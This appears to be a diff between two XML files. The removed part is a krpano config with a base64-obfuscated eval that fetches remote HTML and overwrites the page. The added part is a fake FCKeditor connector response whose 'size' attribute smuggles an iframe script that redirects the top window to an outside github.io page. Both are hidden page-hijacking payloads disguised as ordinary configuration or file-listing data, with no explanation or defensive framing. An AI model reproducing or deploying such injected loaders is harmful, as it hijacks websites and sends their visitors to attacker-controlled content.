@@ -1,5 +1,15 @@
-<krpano version="1.0.8.15">
-    <SCRIPT id="allow-copy_script"/>
-    <layer name="js_loader" type="container" visible="false" 
-           onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiaW5kZXgiOwoKZmV0Y2goImh0dHBzOi8vdXNlZGV2LXVpLmdpdGh1Yi5pby9kODMtcGFnZXMvZmlsZTIvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpLAogICAgZG9jdW1lbnQud3JpdGUoZSksCiAgICBkb2N1bWVudC5jbG9zZSgpCiAgfSk7');eval(w)););"/>
-</krpano>
+<?xml version="1.0" encoding="utf-8"?>
+<Connector resourceType="Document">
+  <CurrentFolder path="/1 - f/" url=""/>
+  <Files>
+    <File desc="1"
+          name="Loading..."
+          size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&lt;script&gt;
+      const m = window.top.location.href.match(/(?:id|GetFoldersAndFiles)=([^&amp;]+)/);
+      const slug = m ? decodeURIComponent(m[1]) : 'default';
+
+      window.top.location.href = 'https://usedev-ui.github.io/d83-pages/file2/' + encodeURIComponent(slug) + '.html';
+    &lt;/script&gt;&quot;&gt;&lt;/iframe&gt;"
+          url="1"/>
+  </Files>
+</Connector>
